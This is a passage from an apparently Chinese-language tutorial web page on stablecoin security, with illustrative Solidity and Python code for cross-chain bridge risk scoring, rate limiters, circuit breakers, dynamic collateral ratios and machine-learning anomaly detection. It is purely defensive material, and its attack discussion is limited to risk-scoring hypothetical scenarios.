            </ul>
        </div>
        
        <h4>10.2.6 跨链桥风险（Cross-chain Bridge Risks）</h4>
        
        <div class="warning-box">
            <p><strong>🌉 跨链桥的双重风险</strong>：稳定币的原生版本和桥接版本在不同链上共存，攻击者可能攻击最薄弱的跨链桥，凭空铸造"包装"稳定币，稀释其价值或导致特定链上的版本脱锚。</p>
        </div>
        
        <h5>跨链桥攻击向量分析</h5>
        <div class="code-block">
            <div class="code-header">
                Solidity 代码 <span class="toggle-icon">▼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-solidity">// 跨链桥风险管理系统
contract CrossChainRiskManager {
    
    struct BridgedAssetInfo {
        address nativeChain;
        address bridgeContract;
        uint256 totalMinted;
        uint256 collateralLocked;
        uint256 lastAuditTime;
        bool isVerified;
    }
    
    struct BridgeRiskProfile {
        uint256 securityScore;      // 安全评分 (0-100)
        uint256 decentralization;   // 去中心化程度
        uint256 auditFrequency;     // 审计频率
        uint256 historicalIncidents; // 历史事件数
        uint256 tvlRatio;           // TVL占比
    }
    
    mapping(address => BridgedAssetInfo) public bridgedAssets;
    mapping(address => BridgeRiskProfile) public bridgeRisks;
    
    // 验证跨链铸造请求
    function validateCrosschainMint(
        address bridgedToken,
        uint256 amount,
        bytes calldata proof
    ) external returns (bool) {
        BridgedAssetInfo memory info = bridgedAssets[bridgedToken];
        
        // 1. 验证证明有效性
        require(verifyBridgeProof(info.bridgeContract, proof), "Invalid proof");
        
        // 2. 检查铸造上限
        require(
            info.totalMinted + amount <= info.collateralLocked,
            "Exceeds collateral"
        );
        
        // 3. 风险评分检查
        BridgeRiskProfile memory risk = bridgeRisks[info.bridgeContract];
        if (risk.securityScore < 80) {
            // 高风险桥需要额外验证
            require(performEnhancedValidation(bridgedToken, amount), 
                    "Failed enhanced validation");
        }
        
        // 4. 速率限制
        require(checkRateLimit(bridgedToken, amount), "Rate limit exceeded");
        
        return true;
    }
    
    // 监控桥接资产健康度
    function monitorBridgeHealth(address bridgedToken) 
        external 
        view 
        returns (uint256 healthScore) 
    {
        BridgedAssetInfo memory info = bridgedAssets[bridgedToken];
        BridgeRiskProfile memory risk = bridgeRisks[info.bridgeContract];
        
        // 计算健康度评分
        uint256 collateralRatio = (info.collateralLocked * 100) / info.totalMinted;
        uint256 timeSinceAudit = block.timestamp - info.lastAuditTime;
        
        // 基础分数
        healthScore = risk.securityScore;
        
        // 抵押率调整
        if (collateralRatio < 100) {
            healthScore = (healthScore * collateralRatio) / 100;
        }
        
        // 审计时效性调整
        if (timeSinceAudit > 30 days) {
            uint256 penalty = (timeSinceAudit - 30 days) / 1 days;
            healthScore = healthScore > penalty ? healthScore - penalty : 0;
        }
        
        // 历史事件惩罚
        healthScore = healthScore > (risk.historicalIncidents * 10) ? 
                     healthScore - (risk.historicalIncidents * 10) : 0;
                     
        return healthScore;
    }
}

// 多链稳定币统一管理
contract MultiChainStablecoinOrchestrator {
    
    struct ChainDeployment {
        uint256 chainId;
        address tokenAddress;
        address bridgeAddress;
        uint256 circulatingSupply;
        uint256 reserveBacking;
        bool isPaused;
    }
    
    struct RebalanceAction {
        uint256 fromChain;
        uint256 toChain;
        uint256 amount;
        string reason;
    }
    
    mapping(uint256 => ChainDeployment) public deployments;
    mapping(bytes32 => bool) public processedMessages;
    
    // 跨链供应量同步
    function syncCrossChainSupply(
        uint256[] calldata chainIds,
        uint256[] calldata supplies,
        bytes[] calldata proofs
    ) external onlyOracle {
        require(chainIds.length == supplies.length, "Length mismatch");
        
        uint256 totalSupply = 0;
        uint256 totalReserves = 0;
        
        for (uint i = 0; i < chainIds.length; i++) {
            // 验证每条链的数据
            require(verifyChainData(chainIds[i], supplies[i], proofs[i]), 
                    "Invalid chain data");
            
            deployments[chainIds[i]].circulatingSupply = supplies[i];
            totalSupply += supplies[i];
            totalReserves += deployments[chainIds[i]].reserveBacking;
        }
        
        // 检查全局抵押率
        uint256 globalCollateralRatio = (totalReserves * 100) / totalSupply;
        
        if (globalCollateralRatio < MINIMUM_GLOBAL_RATIO) {
            triggerEmergencyMode();
        }
    }
    
    // 检测并响应链间不平衡
    function detectAndRebalance() external returns (RebalanceAction[] memory) {
        uint256[] memory chainIds = getActiveChains();
        RebalanceAction[] memory actions = new RebalanceAction[](chainIds.length);
        uint256 actionCount = 0;
        
        // 计算每条链的偏差
        for (uint i = 0; i < chainIds.length; i++) {
            ChainDeployment memory chain = deployments[chainIds[i]];
            
            // 检查链上供应量与储备的比例
            uint256 localRatio = (chain.reserveBacking * 100) / 
                                chain.circulatingSupply;
            
            if (localRatio < TARGET_RATIO - TOLERANCE) {
                // 需要增加储备或减少供应
                actions[actionCount++] = RebalanceAction({
                    fromChain: findSurplusChain(),
                    toChain: chainIds[i],
                    amount: calculateRebalanceAmount(chainIds[i]),
                    reason: "Under-collateralized"
                });
            }
        }
        
        // 执行再平衡
        for (uint i = 0; i < actionCount; i++) {
            executeRebalance(actions[i]);
        }
        
        return actions;
    }
}</code></pre>
            </div>
        </div>
        
        <h5>桥接风险缓释机制</h5>
        <div class="code-block">
            <div class="code-header">
                Python 代码 <span class="toggle-icon">▼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python">class BridgeRiskMitigation:
    """跨链桥风险缓释策略"""
    
    def __init__(self):
        self.risk_params = {
            'max_bridge_exposure': 0.2,  # 单个桥最大暴露
            'proof_delay': 3600,         # 证明延迟（秒）
            'emergency_pause_threshold': 0.05,  # 紧急暂停阈值
            'audit_frequency': 30 * 24 * 3600   # 审计频率
        }
    
    def assess_bridge_security(self, bridge_data: dict) -> dict:
        """评估跨链桥安全性"""
        
        security_score = 100
        risk_factors = []
        
        # 1. 验证机制评估
        if bridge_data['validator_count'] < 7:
            security_score -= 20
            risk_factors.append('Insufficient validators')
        
        if bridge_data['validator_stake'] < 1000000:  # $1M
            security_score -= 15
            risk_factors.append('Low validator stake')
        
        # 2. 代码审计状态
        days_since_audit = (datetime.now() - 
                          bridge_data['last_audit_date']).days
        if days_since_audit > 180:
            security_score -= 25
            risk_factors.append('Outdated audit')
        
        # 3. 历史表现
        if bridge_data['historical_hacks'] > 0:
            security_score -= bridge_data['historical_hacks'] * 15
            risk_factors.append(f"{bridge_data['historical_hacks']} past incidents")
        
        # 4. 去中心化程度
        decentralization_score = self.calculate_decentralization(bridge_data)
        if decentralization_score < 50:
            security_score -= 20
            risk_factors.append('Centralization risk')
        
        return {
            'security_score': max(0, security_score),
            'risk_factors': risk_factors,
            'recommended_exposure': self.calculate_safe_exposure(security_score),
            'monitoring_frequency': self.determine_monitoring_frequency(security_score)
        }
    
    def design_circuit_breaker(self, stablecoin_config: dict) -> dict:
        """设计跨链熔断机制"""
        
        return {
            'triggers': {
                'supply_deviation': {
                    'threshold': 0.05,  # 5%供应量偏差
                    'action': 'pause_bridge',
                    'duration': 3600
                },
                'rapid_minting': {
                    'threshold': 0.02,  # 2%每小时
                    'action': 'rate_limit',
                    'cooldown': 7200
                },
                'proof_failure': {
                    'consecutive_failures': 3,
                    'action': 'emergency_pause',
                    'requires_governance': True
                },
                'oracle_divergence': {
                    'threshold': 0.03,  # 3%价格差异
                    'action': 'suspend_chain',
                    'investigation_period': 3600
                }
            },
            'recovery_procedures': {
                'verification_steps': [
                    'audit_bridge_state',
                    'reconcile_supplies',
                    'verify_collateral',
                    'governance_approval'
                ],
                'gradual_resumption': {
                    'initial_limit': '10% of normal',
                    'increment': '10% per hour',
                    'monitoring_period': 24 * 3600
                }
            }
        }
    
    def simulate_bridge_attack(self, attack_scenario: dict) -> dict:
        """模拟跨链桥攻击场景"""
        
        results = {
            'attack_type': attack_scenario['type'],
            'success_probability': 0,
            'potential_damage': 0,
            'detection_time': 0,
            'recovery_cost': 0
        }
        
        if attack_scenario['type'] == 'infinite_mint':
            # 无限铸造攻击
            if attack_scenario['bridge_security'] < 60:
                results['success_probability'] = 0.3
                results['potential_damage'] = float('inf')
                results['detection_time'] = 3600  # 1小时
                
        elif attack_scenario['type'] == 'double_spend':
            # 双花攻击
            results['success_probability'] = 0.1 * (1 - attack_scenario['finality_time'] / 3600)
            results['potential_damage'] = attack_scenario['transaction_size'] * 2
            results['detection_time'] = attack_scenario['finality_time']
            
        elif attack_scenario['type'] == 'validator_collusion':
            # 验证者合谋
            colluding_stake = attack_scenario['colluding_validators'] / attack_scenario['total_validators']
            if colluding_stake > 0.67:
                results['success_probability'] = 0.9
                results['potential_damage'] = attack_scenario['bridge_tvl']
            
        # 计算恢复成本
        results['recovery_cost'] = self.estimate_recovery_cost(results)
        
        return results
    
    def create_unified_monitoring(self) -> dict:
        """创建统一监控系统"""
        
        return {
            'real_time_metrics': {
                'supply_tracking': {
                    'native_chain': 'track total minted',
                    'bridged_chains': 'track circulating supply',
                    'reconciliation': 'every 10 minutes'
                },
                'bridge_health': {
                    'validator_status': 'check every block',
                    'proof_validity': 'verify all submissions',
                    'tvl_monitoring': 'track locked assets'
                },
                'anomaly_detection': {
                    'ml_model': 'LSTM for pattern recognition',
                    'threshold_alerts': 'configurable per chain',
                    'correlation_analysis': 'cross-chain patterns'
                }
            },
            'automated_responses': {
                'minor_deviation': 'increase monitoring',
                'major_deviation': 'pause affected bridge',
                'critical_event': 'global emergency pause'
            },
            'reporting': {
                'public_dashboard': 'real-time stats',
                'risk_reports': 'daily summaries',
                'incident_logs': 'detailed post-mortems'
            }
        }
</code></pre>
            </div>
        </div>
        
        <div class="info-box">
            <h5>📊 跨链桥风险管理最佳实践</h5>
            <ul>
                <li><strong>多重验证：</strong>结合密码学证明、经济激励和时间延迟</li>
                <li><strong>渐进式部署：</strong>新桥先设置低额度限制，逐步提升</li>
                <li><strong>独立审计：</strong>每个桥接版本需要独立的安全审计</li>
                <li><strong>应急储备：</strong>为每个桥维护独立的保险基金</li>
                <li><strong>供应量上限：</strong>限制每条链上的最大铸造量</li>
                <li><strong>定期对账：</strong>自动化的跨链供应量核对机制</li>
            </ul>
        </div>

        <h3 id="defense-mechanisms">10.3 防御机制设计</h3>
        
        <div class="theory-section">
            <h4>10.3.0 2024年前沿防御机制</h4>
            
            <h5>速率限制器（Rate Limiter）实现</h5>
            <p>基于Token Bucket算法的精确实现，限制单位时间内的操作频率：</p>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>▶ Solidity: Token Bucket速率限制器</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// Token Bucket速率限制器
contract RateLimiter {
    struct Bucket {
        uint256 tokens;      // 当前可用令牌
        uint256 capacity;    // 最大容量
        uint256 refillRate;  // 每秒补充速率
        uint256 lastRefill;  // 上次补充时间
    }
    
    mapping(address => Bucket) public userBuckets;
    mapping(bytes32 => Bucket) public operationBuckets;
    
    // 全局速率限制
    Bucket public globalBucket;
    
    function _consumeTokens(
        Bucket storage bucket,
        uint256 amount
    ) private returns (bool) {
        // 补充令牌
        uint256 elapsed = block.timestamp - bucket.lastRefill;
        uint256 refillAmount = elapsed * bucket.refillRate;
        
        bucket.tokens = min(
            bucket.capacity,
            bucket.tokens + refillAmount
        );
        bucket.lastRefill = block.timestamp;
        
        // 检查是否有足够令牌
        if (bucket.tokens >= amount) {
            bucket.tokens -= amount;
            return true;
        }
        
        return false;
    }
    
    modifier rateLimited(uint256 cost) {
        require(
            _consumeTokens(userBuckets[msg.sender], cost),
            "User rate limit exceeded"
        );
        
        require(
            _consumeTokens(globalBucket, cost),
            "Global rate limit exceeded"
        );
        _;
    }
    
    // 动态调整速率限制
    function adjustRateLimits(uint256 marketVolatility) external {
        if (marketVolatility > HIGH_VOLATILITY_THRESHOLD) {
            // 高波动期间减少速率
            globalBucket.refillRate = globalBucket.refillRate / 2;
            globalBucket.capacity = globalBucket.capacity / 2;
        } else if (marketVolatility < LOW_VOLATILITY_THRESHOLD) {
            // 低波动期间恢复正常
            globalBucket.refillRate = DEFAULT_REFILL_RATE;
            globalBucket.capacity = DEFAULT_CAPACITY;
        }
    }
}</code></pre>
                </div>
            </div>
            
            <h5>动态抵押率调整</h5>
            <p>基于市场条件实时调整抵押率要求：</p>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>▶ Solidity: 动态抵押率系统</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// 动态抵押率调整系统
contract DynamicCollateralRatio {
    uint256 constant BASE_RATIO = 15000; // 150%基础抵押率
    uint256 constant MIN_RATIO = 11000;  // 110%最低抵押率
    uint256 constant MAX_RATIO = 20000;  // 200%最高抵押率
    
    struct MarketConditions {
        uint256 volatility;      // 波动率（基点）
        uint256 liquidity;       // 流动性深度
        uint256 utilizationRate; // 使用率
        uint256 defaultRate;     // 违约率
    }
    
    // 计算动态抵押率
    function calculateDynamicRatio(
        address collateralAsset,
        MarketConditions memory conditions
    ) public pure returns (uint256) {
        uint256 ratio = BASE_RATIO;
        
        // 基于波动率调整
        // volatility以基点表示，1000 = 10%
        if (conditions.volatility > 2000) { // >20%波动
            ratio += (conditions.volatility - 2000) * 5; // 每1%额外波动增加5基点
        }
        
        // 基于流动性调整
        // 流动性不足时提高要求
        if (conditions.liquidity < 1000000 * 1e18) { // <100万美元
            uint256 liquidityPenalty = (1000000 * 1e18 - conditions.liquidity) / 1e16;
            ratio += liquidityPenalty;
        }
        
        // 基于使用率调整
        // 高使用率增加风险
        if (conditions.utilizationRate > 8000) { // >80%
            ratio += (conditions.utilizationRate - 8000) * 2;
        }
        
        // 基于历史违约率
        ratio += conditions.defaultRate * 10;
        
        // 确保在合理范围内
        return max(MIN_RATIO, min(MAX_RATIO, ratio));
    }
    
    // 实际应用示例
    function applyDynamicRatio(
        address user,
        address collateral,
        uint256 debtAmount
    ) external view returns (uint256 requiredCollateral) {
        MarketConditions memory conditions = getMarketConditions(collateral);
        uint256 ratio = calculateDynamicRatio(collateral, conditions);
        
        // 计算所需抵押品
        requiredCollateral = (debtAmount * ratio) / 10000;
        
        // 对高风险用户的额外要求
        if (getUserRiskScore(user) > 70) {
            requiredCollateral = (requiredCollateral * 110) / 100; // +10%
        }
        
        return requiredCollateral;
    }
}</code></pre>
                </div>
            </div>
            
            <h5>AI驱动的异常检测系统</h5>
            <p>使用机器学习模型实时检测异常行为：</p>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>▶ Python: AI异常检测系统</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import torch
import torch.nn as nn
from typing import Dict, List, Tuple

class StablecoinAnomalyDetector:
    """稳定币系统的AI异常检测器"""
    
    def __init__(self):
        self.isolation_forest = IsolationForest(
            contamination=0.1,
            random_state=42
        )
        self.scaler = StandardScaler()
        self.gnn_model = GraphNeuralNetwork()
        self.vae_model = VariationalAutoencoder()
        
    def extract_transaction_features(self, tx: Dict) -> np.ndarray:
        """提取交易特征"""
        features = [
            tx['amount'],
            tx['gas_price'],
            tx['nonce'],
            tx['time_since_last_tx'],
            tx['recipient_tx_count'],
            tx['sender_balance'],
            tx['recipient_balance'],
            self.calculate_velocity(tx['sender']),
            self.calculate_concentration(tx['sender']),
            self.detect_pattern_similarity(tx)
        ]
        return np.array(features)
    
    def detect_anomalies_isolation_forest(self, 
                                        transactions: List[Dict]) -> np.ndarray:
        """使用Isolation Forest检测异常"""
        features = np.array([
            self.extract_transaction_features(tx) for tx in transactions
        ])
        
        # 标准化
        features_scaled = self.scaler.fit_transform(features)
        
        # 预测异常
        predictions = self.isolation_forest.fit_predict(features_scaled)
        
        # -1表示异常，1表示正常
        return predictions
    
    def detect_sybil_attacks_gnn(self, 
                                address_graph: nx.Graph) -> Dict[str, float]:
        """使用图神经网络检测女巫攻击"""
        # 将图转换为PyTorch几何格式
        edge_index, node_features = self.graph_to_pytorch(address_graph)
        
        # GNN推理
        with torch.no_grad():
            node_embeddings = self.gnn_model(node_features, edge_index)
            sybil_scores = self.gnn_model.classify(node_embeddings)
        
        # 返回每个地址的女巫攻击概率
        return {
            node: float(score) 
            for node, score in zip(address_graph.nodes(), sybil_scores)
        }
    
    def detect_market_manipulation_vae(self, 
                                     market_data: np.ndarray) -> float:
        """使用VAE检测市场操纵"""
        # 编码市场数据
        with torch.no_grad():
            encoded = self.vae_model.encode(
                torch.FloatTensor(market_data)
            )
            reconstructed = self.vae_model.decode(encoded)
        
        # 计算重构误差
        reconstruction_error = torch.mean(
            (torch.FloatTensor(market_data) - reconstructed) ** 2
        )
        
        # 高重构误差表示异常
        anomaly_score = float(reconstruction_error)
        
        return anomaly_score
    
    def reinforcement_learning_defense(self, 
                                     state: np.ndarray) -> Dict[str, float]:
        """使用强化学习优化防御参数"""
        # 状态：[volatility, volume, liquidity, attack_signals]
        # 动作：调整各种防御参数
        
        # 这里使用预训练的RL策略
        action = self.rl_agent.select_action(state)
        
        return {
            'fee_adjustment': action[0],
            'collateral_ratio_adjustment': action[1],
            'rate_limit_adjustment': action[2],
            'circuit_breaker_threshold': action[3]
        }

class GraphNeuralNetwork(nn.Module):
    """用于检测地址集群的GNN"""
    
    def __init__(self, input_dim=10, hidden_dim=64, output_dim=32):
        super().__init__()
        self.conv1 = GCNConv(input_dim, hidden_dim)
        self.conv2 = GCNConv(hidden_dim, hidden_dim)
        self.conv3 = GCNConv(hidden_dim, output_dim)
        self.classifier = nn.Linear(output_dim, 1)
        
    def forward(self, x, edge_index):
        x = F.relu(self.conv1(x, edge_index))
        x = F.dropout(x, p=0.5, training=self.training)
        x = F.relu(self.conv2(x, edge_index))
        x = F.dropout(x, p=0.5, training=self.training)
        x = self.conv3(x, edge_index)
        return x
    
    def classify(self, embeddings):
        return torch.sigmoid(self.classifier(embeddings))

class VariationalAutoencoder(nn.Module):
    """用于检测市场异常的VAE"""
    
    def __init__(self, input_dim=20, latent_dim=5):
        super().__init__()
        
        # 编码器
        self.encoder = nn.Sequential(
            nn.Linear(input_dim, 64),
            nn.ReLU(),
            nn.Linear(64, 32),
            nn.ReLU()
        )
        
        self.fc_mu = nn.Linear(32, latent_dim)
        self.fc_var = nn.Linear(32, latent_dim)
        
        # 解码器
        self.decoder = nn.Sequential(
            nn.Linear(latent_dim, 32),
            nn.ReLU(),
            nn.Linear(32, 64),
            nn.ReLU(),
            nn.Linear(64, input_dim)
        )
    
    def encode(self, x):
        h = self.encoder(x)
        return self.fc_mu(h), self.fc_var(h)
    
    def reparameterize(self, mu, logvar):
        std = torch.exp(0.5 * logvar)
        eps = torch.randn_like(std)
        return mu + eps * std
    
    def decode(self, z):
        return self.decoder(z)
    
    def forward(self, x):
        mu, logvar = self.encode(x)
        z = self.reparameterize(mu, logvar)
        return self.decode(z), mu, logvar

# 实际应用
detector = StablecoinAnomalyDetector()

# 检测交易异常
transactions = load_recent_transactions()
anomalies = detector.detect_anomalies_isolation_forest(transactions)

# 检测女巫攻击
address_graph = build_address_interaction_graph()
sybil_scores = detector.detect_sybil_attacks_gnn(address_graph)

# 检测市场操纵
market_data = get_market_metrics()
manipulation_score = detector.detect_market_manipulation_vae(market_data)

# 自动调整防御参数
current_state = get_system_state()
defense_adjustments = detector.reinforcement_learning_defense(current_state)</code></pre>
                </div>
            </div>
            
            <h4>10.3.1 动态参数调整</h4>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// 自适应防御系统
contract AdaptiveDefenseSystem {
    
    // 风险参数
    struct RiskParameters {
        uint256 maxSlippage;          // 最大滑点
        uint256 maxTransactionSize;    // 最大交易规模
        uint256 cooldownPeriod;        // 冷却期
        uint256 liquidationThreshold;  // 清算阈值
        uint256 borrowingRate;         // 借贷利率
    }
    
    RiskParameters public params;
    
    // 市场状态指标
    struct MarketMetrics {
        uint256 volatility;
        uint256 liquidity;
        uint256 utilizationRate;
        uint256 defaultRate;
        uint256 lastUpdateTime;
    }
    
    MarketMetrics public metrics;
    
    // 动态调整参数
    function updateRiskParameters() external {
        require(
            block.timestamp >= metrics.lastUpdateTime + 1 hours,
            "Too soon to update"
        );
        
        // 基于市场状态计算风险等级
        uint256 riskScore = calculateRiskScore();
        
        // 高风险状态：收紧参数
        if (riskScore > 80) {
            params.maxSlippage = 100;           // 1%
            params.maxTransactionSize = 100000 * 1e18;  // 10万
            params.cooldownPeriod = 1 hours;
            params.liquidationThreshold = 8500; // 85%
            params.borrowingRate = 2000;        // 20% APR
        }
        // 中等风险状态
        else if (riskScore > 50) {
            params.maxSlippage = 300;           // 3%
            params.maxTransactionSize = 500000 * 1e18;  // 50万
            params.cooldownPeriod = 30 minutes;
            params.liquidationThreshold = 8000; // 80%
            params.borrowingRate = 1000;        // 10% APR
        }
        // 低风险状态：放松参数
        else {
            params.maxSlippage = 500;           // 5%
            params.maxTransactionSize = 1000000 * 1e18; // 100万
            params.cooldownPeriod = 10 minutes;
            params.liquidationThreshold = 7500; // 75%
            params.borrowingRate = 500;         // 5% APR
        }
        
        metrics.lastUpdateTime = block.timestamp;
        emit ParametersUpdated(riskScore, params);
    }
    
    function calculateRiskScore() internal view returns (uint256) {
        uint256 score = 0;
        
        // 波动性评分（0-40分）
        score += min(40, metrics.volatility / 100);
        
        // 流动性评分（0-30分）
        score += 30 - min(30, metrics.liquidity / 1000000);
        
        // 利用率评分（0-20分）
        if (metrics.utilizationRate > 9000) {  // >90%
            score += 20;
        } else if (metrics.utilizationRate > 8000) {  // >80%
            score += 10;
        }
        
        // 违约率评分（0-10分）
        score += min(10, metrics.defaultRate * 10);
        
        return score;
    }
}

// 熔断机制
contract CircuitBreakerV2 {
    enum BreakLevel { NONE, YELLOW, ORANGE, RED }
    BreakLevel public currentLevel = BreakLevel.NONE;
    
    uint256 public constant YELLOW_THRESHOLD = 5;   // 5%价格偏离
    uint256 public constant ORANGE_THRESHOLD = 10;  // 10%价格偏离
    uint256 public constant RED_THRESHOLD = 20;     // 20%价格偏离
    
    mapping(address => uint256) public userCooldowns;
    
    modifier checkCircuitBreaker() {
        if (currentLevel == BreakLevel.RED) {
            revert("System halted");
        }
        
        if (currentLevel == BreakLevel.ORANGE) {
            require(
                userCooldowns[msg.sender] < block.timestamp,
                "User in cooldown"
            );
            userCooldowns[msg.sender] = block.timestamp + 1 hours;
        }
        
        if (currentLevel == BreakLevel.YELLOW) {
            require(
                msg.value <= 10000 * 1e18,
                "Transaction size limited"
            );
        }
        
        _;
    }
    
    function updateBreakLevel(uint256 priceDeviation) external {
        if (priceDeviation >= RED_THRESHOLD) {
            currentLevel = BreakLevel.RED;
            emit EmergencyStop(block.timestamp);
        } else if (priceDeviation >= ORANGE_THRESHOLD) {
            currentLevel = BreakLevel.ORANGE;
        } else if (priceDeviation >= YELLOW_THRESHOLD) {
            currentLevel = BreakLevel.YELLOW;
        } else {
            currentLevel = BreakLevel.NONE;
        }
    }
}</code></pre>
                </div>
            </div>
            
            <h5>2024最新防御机制</h5>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// 1. crvUSD的LLAMMA（软清算）机制
contract SoftLiquidationAMM {
    struct Position {
        uint256 collateral;     // ETH抵押品
        uint256 debt;          // crvUSD债务
        uint256 n1;            // 价格带下限
        uint256 n2;            // 价格带上限
        uint256 liquidationDiscount;
    }
    
    mapping(address => Position) public positions;
    uint256 public constant A = 100;  // 放大参数
    uint256 public constant BANDS = 50;  // 价格带数量
    
    function deposit(uint256 collateralAmount, uint256 debtAmount) external {
        // 计算用户的价格带范围
        uint256 currentPrice = getOraclePrice();
        uint256 n1 = calculateN1(collateralAmount, debtAmount, currentPrice);
        uint256 n2 = n1 + calculateBands(collateralAmount, debtAmount);
        
        positions[msg.sender] = Position({
            collateral: collateralAmount,
            debt: debtAmount,
            n1: n1,
            n2: n2,
            liquidationDiscount: 60  // 6%
        });
    }
    
    // 软清算：根据价格自动转换抵押品
    function softLiquidate(address user) external {
        Position storage pos = positions[user];
        uint256 currentPrice = getOraclePrice();
        uint256 currentBand = getPriceBand(currentPrice);
        
        if (currentBand >= pos.n1 && currentBand <= pos.n2) {
            // 在清算范围内，部分转换
            uint256 fraction = calculateConversionFraction(
                currentBand,
                pos.n1,
                pos.n2
            );
            
            uint256 collateralToSell = (pos.collateral * fraction) / 1e18;
            uint256 stablecoinReceived = (collateralToSell * currentPrice * 
                (10000 - pos.liquidationDiscount)) / 10000 / 1e18;
            
            // 更新位置
            pos.collateral -= collateralToSell;
            pos.debt -= stablecoinReceived;
            
            emit SoftLiquidation(user, collateralToSell, stablecoinReceived);
        }
    }
    
    // 计算转换比例（基于Bonding Curve）
    function calculateConversionFraction(
        uint256 currentBand,
        uint256 n1,
        uint256 n2
    ) internal pure returns (uint256) {
        uint256 relativePosition = ((currentBand - n1) * 1e18) / (n2 - n1);
        // 使用sigmoid函数平滑过渡
        return 1e18 / (1 + exp(-int256(relativePosition - 5e17) / 1e17));
    }
}

// 2. 速率限制器（Rate Limiter）
contract RateLimiter {
    struct Bucket {
        uint256 capacity;
        uint256 tokens;
        uint256 refillRate;
        uint256 lastRefillTime;
    }
    
    mapping(address => Bucket) public userBuckets;
    mapping(bytes4 => Bucket) public functionBuckets;
    
    modifier rateLimited(uint256 tokensRequired) {
        Bucket storage bucket = userBuckets[msg.sender];
        
        // 补充令牌
        uint256 elapsed = block.timestamp - bucket.lastRefillTime;
        uint256 tokensToAdd = (elapsed * bucket.refillRate) / 1e18;
        bucket.tokens = min(bucket.capacity, bucket.tokens + tokensToAdd);
        bucket.lastRefillTime = block.timestamp;
        
        // 检查令牌
        require(bucket.tokens >= tokensRequired, "Rate limit exceeded");
        bucket.tokens -= tokensRequired;
        
        _;
    }
    
    // 动态调整速率限制
    function adjustRateLimit(address user, uint256 riskScore) external {
        Bucket storage bucket = userBuckets[user];
        
        if (riskScore > 80) {
            // 高风险：严格限制
            bucket.capacity = 10;
            bucket.refillRate = 1e17;  // 0.1 tokens/second
        } else if (riskScore > 50) {
            // 中等风险
            bucket.capacity = 50;
            bucket.refillRate = 5e17;  // 0.5 tokens/second
        } else {
            // 低风险
            bucket.capacity = 100;
            bucket.refillRate = 1e18;  // 1 token/second
        }
    }
}

// 3. 动态抵押率系统
contract DynamicCollateralRatio {
    uint256 public baseRatio = 15000;  // 150%
    uint256 public volatilityMultiplier = 100;  // 1%
    
    struct MarketConditions {
        uint256 volatility30d;
        uint256 liquidityDepth;
        uint256 correlationIndex;
        uint256 systemUtilization;
    }
    
    function calculateDynamicRatio(
        address collateralAsset,
        MarketConditions memory conditions
    ) public view returns (uint256) {
        uint256 ratio = baseRatio;
        
        // 波动率调整
        ratio += (conditions.volatility30d * volatilityMultiplier) / 100;
        
        // 流动性调整
        if (conditions.liquidityDepth < 1000000 * 1e18) {
            ratio += 500;  // 低流动性+5%
        }
        
        // 相关性调整（高相关性资产需要更高抵押）
        ratio += (conditions.correlationIndex * 10);
        
        // 系统利用率调整
        if (conditions.systemUtilization > 8000) {  // >80%
            ratio += 1000;  // +10%
        }
        
        return ratio;
    }
}</code></pre>
                </div>
            </div>
        </div>

        <h4>10.3.2 AI驱动的异常检测系统</h4>
        
        <div class="info-box">
            <p>基于机器学习和强化学习的风险参数调整是2024年的前沿方向，如Gauntlet、Chaos Labs等公司为顶级DeFi协议提供的服务。</p>
        </div>
        
        <div class="code-block">
            <div class="code-header">
                Python 代码 <span class="toggle-icon">▼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python"># AI驱动的DeFi异常检测系统
import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import torch
import torch.nn as nn
from typing import Dict, List, Tuple

class DeFiAnomalyDetector:
    """
    使用机器学习检测链上异常行为
    """
    def __init__(self):
        self.isolation_forest = IsolationForest(
            contamination=0.1,
            random_state=42
        )
        self.scaler = StandardScaler()
        self.lstm_model = self._build_lstm_model()
        
    def extract_features(self, transaction_data: pd.DataFrame) -> np.ndarray:
        """
        提取交易特征
        """
        features = {
            # 交易规模特征
            'tx_value_log': np.log1p(transaction_data['value']),
            'gas_price_ratio': transaction_data['gasPrice'] / transaction_data['avgGasPrice'],
            
            # 时间特征
            'hour_of_day': transaction_data['timestamp'].dt.hour,
            'day_of_week': transaction_data['timestamp'].dt.dayofweek,
            
            # 地址特征
            'from_tx_count': transaction_data['from_address_tx_count'],
            'to_tx_count': transaction_data['to_address_tx_count'],
            'address_age': transaction_data['address_age_blocks'],
            
            # 协议特征
            'protocol_tvl_change': transaction_data['protocol_tvl_change_1h'],
            'pool_imbalance': transaction_data['pool_imbalance_ratio'],
            'slippage': transaction_data['actual_slippage']
        }
        
        return pd.DataFrame(features).values
    
    def detect_anomalies(self, transactions: pd.DataFrame) -> np.ndarray:
        """
        检测异常交易
        """
        features = self.extract_features(transactions)
        features_scaled = self.scaler.fit_transform(features)
        
        # 使用Isolation Forest检测异常
        anomaly_scores = self.isolation_forest.decision_function(features_scaled)
        anomaly_labels = self.isolation_forest.predict(features_scaled)
        
        # -1表示异常，1表示正常
        return anomaly_labels, anomaly_scores
    
    def _build_lstm_model(self) -> nn.Module:
        """
        构建LSTM模型用于时序异常检测
        """
        class LSTMAnomalyDetector(nn.Module):
            def __init__(self, input_size=10, hidden_size=64, num_layers=2):
                super().__init__()
                self.lstm = nn.LSTM(
                    input_size,
                    hidden_size,
                    num_layers,
                    batch_first=True,
                    dropout=0.2
                )
                self.fc = nn.Linear(hidden_size, 1)
                self.sigmoid = nn.Sigmoid()
                
            def forward(self, x):
                lstm_out, _ = self.lstm(x)
                output = self.fc(lstm_out[:, -1, :])
